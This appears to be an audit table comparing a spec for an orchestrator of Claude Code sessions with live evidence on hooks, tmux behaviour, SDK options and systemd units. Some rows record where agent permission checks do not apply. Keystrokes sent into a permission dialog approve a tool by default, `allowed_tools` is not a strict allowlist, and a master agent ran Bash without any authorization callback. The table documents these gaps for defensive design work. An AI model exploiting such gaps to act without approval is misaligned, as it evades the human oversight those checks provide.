| 958–960 | auth_failed / account_blocked / bad_request sets cover the StopFailure values | The enum also has `verification_required` and `cloud_credential_error`, and no row maps them | `hooks/binary/enum-sources.txt` |
| 960 | `bad_request` when error ∈ {invalid_request, model_not_found} | A generic 400 `invalid_request_error` produced `error:"unknown"`. Only a prompt-too-long 400 maps to `invalid_request` (with `error_details`), and a credit-balance 400 maps to `billing_error`. The API was mocked | `hooks/live/S08_mock_http400/events.jsonl`, `hooks/live/S08_mock_prompt_too_long/events.jsonl`, `hooks/live/S08_mock_http402/events.jsonl` |
| 962, 963, 976, 1025, 2531 | Rules key on `Stop.stop_reason` (max_tokens, tool_use, end_turn) | The Stop payload has no `stop_reason`: absent in 26 captures and in the zod schema. A mock max_tokens stream produced StopFailure `error:"max_output_tokens"` and no Stop | `hooks/live/S10_effort_sonnet/events.jsonl`, `hooks/live/S11_background_task/events.jsonl`, `hooks/live/S08_mock_max_tokens/events.jsonl` |
| 966 | `context_exhausted` = PreCompact{auto} with no PostCompact before death | Killing a session mid-compaction matches the rule: PreCompact{auto}, then SessionEnd{other}, no PostCompact. But a healthy real-API session also emitted PreCompact{auto} with no PostCompact on 2 of 3 turns, each ending with a normal Stop. Any later death would be misclassified without a time or Stop bound (gap-fill) | `gap-fill/autocompact-real-20260914T174911Z/results.json`, `hooks.jsonl`, `gap-fill/lifecycle-end-20260914T175238Z/results.json` |
| 967–970 | `SessionEnd.end_reason` = prompt_input_exit / clear / logout / resume; resume → resumed_elsewhere | The field is `reason`. Values observed: `other` 47, `clear` 2, `prompt_input_exit` 1 (hooks). Every `-p` exit, `tmux kill-session` and SIGTERM give `other`, which has no row. `logout` and `resume` were verified in an isolated config dir (gap-fill). `/resume` inside a running TUI ends the old `session_id` and continues in the same process and pane as the other session (SessionStart{source:resume}). A pane-keyed owned session must therefore rebind rather than stop | `hooks/live/S06_clear/events.jsonl`, `hooks/live/I01_interactive/events.jsonl`, `tmux-tui/run-20260914T154946Z/hooks-a.jsonl` l.34, 36, 37, `gap-fill/lifecycle-end-20260914T175238Z/hooks.jsonl`, `gap-fill/pidfd-pty-20260914T175854Z/results.json` |
| 1022 | The model verdict reads the transcript tail (last ~20 entries) | 44.4% of user-data entries are not user/assistant: 27.6% metadata-only, 14.6% attachments, 2.2% system. Metadata is re-appended at turn end, and `prompt_snapshot` attachments embed the whole system prompt. In 15 copied throwaways the last 20 lines hold only 2–9 user/assistant entries. The tail must filter by type | `transcripts/captures/real-transcripts-stats.json`, `transcripts/copies/*/*.jsonl` |
| 1135 | Owned sessions on a dedicated socket (`tmux -L shepherd`) | A socket named `shepherd` already exists on this host and carries the user's live sessions. The capture lists socket names only; the live server was seen in the auditor's read-only `ps`. The socket name must be configuration | `tmux-tui/run-20260914T154946Z/tmux-socket-names.txt` |
| 1140 | `capture-pane -e -p -S -2000` returns the screen with ANSI intact plus scrollback | ANSI is intact, but the TUI runs on the alternate screen with `history_size` 0. After an 80-line answer in a 30-row pane, `-S -2000` returned only the 30 visible lines | `tmux-tui/supp-20260914T155346Z/04-scrollback-stats.txt`, `04-capture-S2000.txt` |
| 1141, 117 (with Runner.resize l.428) | `tmux attach` makes jump-to-terminal exact | `resize-window` switches the window to `window-size=manual`. A human attaching from a different-size terminal then sees a clipped, panning viewport or dead space. With `window-size latest`, the attached client's size overrides the browser's. `attach -f ignore-size` did not stop the window following the only client, and `attach -r` delivers no keys (gap-fill) | `gap-fill/tmux-attach-keys-20260914T170850Z/attach.txt`, `A2-outer-client-view.txt` |
| 1168 | needs_you → write immediately (it is asking you) | When needs_you comes from a permission dialog, text sent with `send-keys -l` is discarded. The Enter that follows picks the default "1. Yes", so the tool is approved and the message never reaches the model | `tmux-tui/supp2-20260914T155625Z/B2-after-typing-into-dialog.txt`, `B-hooks.json`, `B-file-created.txt` |
| 1169, 1181, 938 | Mailbox delivery triggers on Stop; running sessions queue until the next Stop | An interrupted turn emits no Stop and no PostToolUseFailure; this held for Esc or C-c during a tool and for Esc during streaming. After Esc during streaming the prompt is put back in the input box, and the next programmatic write is concatenated onto it (gap-fill) | `gap-fill/interrupt-20260914T172251Z/results.json`, `hooks.jsonl`, `gap-fill/interrupt-real-20260914T172811Z/hooks.jsonl` |
| 1203 | Fork the target, ask the fork, discard the fork | The fork's transcript stays on disk after `/exit`. The fork inherits the user title (`custom-title`, `agent-name`, registry `nameSource:user`), so two sessions share one name. `--no-session-persistence` works only with `--print`, so discarding the fork is an explicit cleanup step. The fork carries only the history after the last compact. The original transcript's sha256 was unchanged | `tmux-tui/run-20260914T154946Z/12-fork-summary.json`, `12-fork-structure.txt`, `13-dead-pane.txt`, `claude-help-excerpt.txt` |
| 1204–1205 | The SessionStart hook's `start_reason` enum includes `fork` | The key is `source` (`"source":"fork"`); no `start_reason` key appears anywhere. Forking itself works as D13 needs: new session id, new file, target untouched even when forked mid-tool-call | `hooks/live/S04_fork/events.jsonl`, `transcripts/captures/hooks-lifecycle.jsonl`, `transcripts/captures/forklive-meta.txt`, `tmux-tui/run-20260914T154946Z/hooks-a.jsonl` l.30 |
| 1374 (with D22 l.126, l.632) | Worker worktrees at `<repo>-wt/<KEY>/`; a session binds to a repo by longest-prefix match of cwd | A linked worktree is a sibling of `<repo>`, and `--show-toplevel` returns the worktree path, so no prefix matches and `repo_id` is null. Only `rev-parse --path-format=absolute --git-common-dir` or `worktree list --porcelain` maps it back. The spec contradicts itself: Appendix A (l.2426, 2431) shows `repo_id rep_b2` for cwd `…/billing-api-wt/PROJ-81711` | `linux-process-git/captures/git.txt` §D |
| 1377, 2112 | `spawn_session(project, brief, …)` with argv lists only | A positional brief auto-submits and stays byte-exact only when tmux gets separate argv words; a single command string goes through `sh -c` and expands `$()` and quotes. tmux rejects commands over ~16 KB. A brief starting with `-` fails with "error: unknown option" unless it comes after `--` (gap-fill) | `gap-fill/argv-20260914T173100Z/results.json`, `gap-fill/argv-limits-20260914T173342Z/tmux-argv-limit.txt`, `claude-dash-brief.stderr` |
| 1431–1433, 1695, 1540 | Tier-2 sessions reach SESSION_TOOLS via stdio `shepherd-mcp`, with an allowlist | A user-scope server added with `claude mcp add` is not seen by sessions already running. In `-p`, `permissions.allow` in `.claude/settings.json` of an untrusted dir (e.g. a fresh worktree) is ignored with a stderr warning, and the tool is denied. Rules passed via `--settings` or `--allowedTools <rule> --` work for `mcp__shepherd`, `mcp__shepherd__*` and `mcp__shepherd__ping`. Without a rule the TUI prompts on every call (gap-fill) | `gap-fill/config-scopes-20260914T173908Z/results.json`, `mcp-s2-permission-screen.txt`, `gap-fill/mcp-perm-p-20260914T174121Z/results.json` |
| 1455 | `ToolDef.input_schema: dict` is plain JSON Schema | `create_sdk_mcp_server` passes a dict through unchanged only if it has a string `type` AND a `properties` key. Any other dict is treated as a `{param: python_type}` map with every key required, so `{"type":"object"}` gets mangled. Verified from installed source, not provoked live | `agent-sdk-mcp/captures/introspect/internals-source.txt` l.429–449 |
| 1464–1472, 1475–1480 | `invoke()` calls the handler after authorize; the exporters are thin translators | The SDK in-process server validates arguments with jsonschema before the handler, returning "Input validation error" without calling the handler. Claude Code 2.1.270 forwarded `{"count":5}` (missing required `text`) to the stdio server. The stdio exporter or `invoke()` must validate, or the two bindings diverge | `agent-sdk-mcp/captures/stdio-mcp/mcp-wire.jsonl` l.13, `agent-sdk-mcp/captures/locked/raw-stream.jsonl` l.63–64, 73–74, `agent-sdk-mcp/captures/locked/handler-calls.jsonl` |
| 1528 | `setting_sources=[]`: no CLAUDE.md, no cc10x, no skills | Project CLAUDE.md is excluded (marker test). Skills are not excluded: `system/init.skills` lists 17 bundled skills, and a `skill_listing` attachment is injected. The account's claude.ai connectors and a `session_context` userEmail attachment also reach the master. cc10x exclusion is unverified | `agent-sdk-mcp/captures/isolation/meta.json`, `isolation/raw-stream.jsonl`, `resume/transcript-e6fed1a4-c0b1-41d6-be36-b445e606c5a1.jsonl` l.6, 7, 10 |
| 1534 (vs 1728) | `can_use_tool=authorize`, where `authorize(tool: ToolDef, args, ctx) -> Decision` | The installed type is `(str tool_name, dict input, ToolPermissionContext) -> Awaitable[PermissionResultAllow\|PermissionResultDeny]`, and the tool name arrives MCP-prefixed. The callback is never invoked for whole-tool `allowed_tools` entries (`CanUseToolShadowedWarning`). With the §11 block, `authorize()` never sees any ORCHESTRATOR_TOOLS call | `agent-sdk-mcp/captures/introspect/options-signature.txt`, `locked/meta.json`, `locked/can-use-tool.jsonl` |
| 1540 (and D10 l.113) | `allowed_tools` is a strict allowlist: `mcp__shepherd__*` plus connector tools | `allowed_tools` only auto-approves. With the spec block, `system/init.tools` has 75 entries: 32 built-ins, 38 claude.ai connector tools and 5 shepherd tools. `tools=[]` leaves 43; `tools=[]` + `strict_mcp_config=True` leaves 5 | `agent-sdk-mcp/captures/basic/raw-stream.jsonl`, `tools_empty/raw-stream.jsonl`, `locked/raw-stream.jsonl`, `introspect/options-source.txt` |
| 1542–1543 | The master has no Read, Write, Edit, Bash or WebFetch; it cannot touch the filesystem | The spec-configured master listed those tools and ran Bash `echo hi` (output `hi`) with no `can_use_tool` request; only a PreToolUse hook callback saw it. An allow rule is ruled out as the cause; the "read-only Bash auto-allow" explanation is inferred | `agent-sdk-mcp/captures/basic/raw-stream.jsonl` l.10, 101, 102, 106, `basic/can-use-tool.jsonl` |
| 1737–1738, 1747 | `authorize()` shows an approval card and blocks the turn (timeout 600 s) | Blocking was confirmed for 75 s, and for 630 s in gap-fill. `interrupt()` while approval is pending makes the CLI send `control_cancel_request`, and the callback coroutine gets CancelledError. The tool_result then has `non_execution_kind:"user-rejected"`. The spec has no path to withdraw the card | `agent-sdk-mcp/captures/interrupt_pending_approval/raw-stream.jsonl` l.18–23, `can-use-tool.jsonl`, `slow_approval/can-use-tool.jsonl`, `gap-fill/sdk-approval_timeout-syscli-20260914T171129Z/can-use-tool.jsonl` |
| 1870 (with 609) | Subagent lines show type, description, elapsed and state, read from the transcript | No structured state field exists in a subagent `.jsonl` or `.meta.json`. Agent-tool state exists only as the `<status>` text inside a `<task-notification>`, or as the tool_result for foreground agents. Workflow agents live under `subagents/workflows/wf_<runId>/` with no `toolUseId` and `agentType:"workflow-subagent"`; their state is in `journal.jsonl` / `wf_<runId>.json`. An Agent call with no `run_in_background` still ran in the background. SubagentStop `background_tasks` lists the stopping agent as `running` | `transcripts/copies/-tmp-shp-schemas-tx-blIf90-work/0141fab3-8bf8-4b69-be1f-89552ccfce5d.jsonl` l.28, `transcripts/captures/main-stdout.jsonl`, `…/518c280f-3791-4571-ae9a-f002c8f3b33c/subagents/workflows/wf_edb19b07-a69/journal.jsonl`, `transcripts/captures/hooks-lifecycle.jsonl` |
| 2052–2053 (with 2050–2051) | Redaction covers `action_log.args` and `work_item.raw`; DB, UI and agents see only `credential_ref` | `git remote get-url` returns embedded credentials verbatim (`https://oauth2:<token>@host/…`). Stored raw in `repo.vcs_remote`, that would put a token into the DB, UI and agent context, and URL userinfo is not a secret-shaped key | `linux-process-git/captures/git.txt` §B |
| 2209 (and 406) | `shepherd install` creates a venv; the backend uses claude-agent-sdk | `python3 -m venv` fails with rc=1: no ensurepip, and python3.12-venv and pip are not installed. `--without-pip` gives rc=0, but then nothing can install claude-agent-sdk. The SDK probe had to bootstrap pip with get-pip.py | `linux-process-git/captures/secrets-runtime.txt`, `agent-sdk-mcp/run_all.sh` |
| 2215–2216 | Both user units use `Restart=always` | `Restart=always` alone gives up. Under the default `StartLimitBurst=5` / `StartLimitIntervalUSec=10s`, the unit logged "Start request repeated too quickly." and ended failed after 5 restarts (RestartSec=500ms, crash after ~1 s). The spec sets no start-limit policy | `linux-process-git/captures/systemd-xdg.txt` |
| 2219 (and 312) | Sockets under `$XDG_RUNTIME_DIR/shepherd/` | With `XDG_RUNTIME_DIR` unset (`env -u`, `env -i`), `systemctl --user` fails with "Failed to connect to bus: No medium found". The spec gives no `/run/user/<uid>` fallback. That hookd could lack the variable is inferred; all 24 captured hook envs had it | `linux-process-git/captures/systemd-xdg.txt`, `proc-hooks.jsonl` |
| 2230–2232 | Merge a marked block into `~/.claude/settings.json` with `"_shepherd_managed": true` per entry | The extra key is accepted silently in project, local and `--settings` scope, and in user scope in an isolated config dir (gap-fill). But one malformed PreToolUse or PermissionRequest entry disables every hook in that file, and invalid JSON makes the whole file ignored. `-p` reports neither; only `claude doctor` does | `hooks/live/R03_config_extra_keys_group_and_entry/events.jsonl`, `hooks/live/R03_config_pretooluse_broken/doctor.txt`, `events.jsonl`, `hooks/live/R03_config_invalid_json_file/doctor.txt`, `gap-fill/config-scopes-20260914T173908Z/user-user-settings.json` |
| 2330 | Hook payload fields (TaskCreated/Completed, FileChanged, SubagentStart/Stop, Notification.notification_type, StopFailure.error_type) are documented, not observed | All of them are now observed live, with the name and semantics differences in the rows above. `StopFailure.error_type` does not exist | `hooks/live/_field-matrix.txt` |
| 2354 | `:` in a session name is rewritten to `_` | `.` is also rewritten to `_`, and `.` in a `-t` target selects a pane (`-t shepherd.dot1` resolves to session `shepherd`). Unprefixed targets use unique-prefix matching. `display-message -p` on a missing target returns rc 0 with empty output, so it is not an existence check; `has-session -t =name` is (gap-fill) | `gap-fill/tmux-naming-20260914T170739Z/naming.txt` |
| 2399–2432 (Appendix A) vs D39 l.143 | Worked-example paths are `/Users/noamsalit/Git/…` | The target is Linux (D39). Real paths on this host are `/root/Shepherd` and `/root/src/cc10x-qa` | `linux-process-git/captures/git.txt` §A |

**Checked and not corrections.** The auditors refuted these, and each stays in its surface as a caveat or gap:
- l.887/918: SessionEnd missing in `-p` is covered because Stop or StopFailure still fired.
- l.893: the spec does not register WorktreeCreate, though any command hook on it breaks `--worktree`.
- l.945–947: the tool name comes from PermissionRequest.
- l.963–964: "neither is a crash" was wrong for an unprompted SIGTERM; the real gap is killed-vs-crashed precedence.
- l.652: `--session-id` is an opportunity, not a contradiction.
- l.1536: `cwd=None` is a gap.
- l.406: the SDK bundles 2.1.259 and prefers it over PATH `claude` unless `cli_path` is set; this is a gap.
- l.445/447: `ClaudeSDKClient` has no resume/configure; these are constructor options.
- l.517: seat billing still reports list-price `total_cost_usd`; this is a UI caveat.
- l.168 (mypy) and l.570 (sqlite3 CLI): host notes.

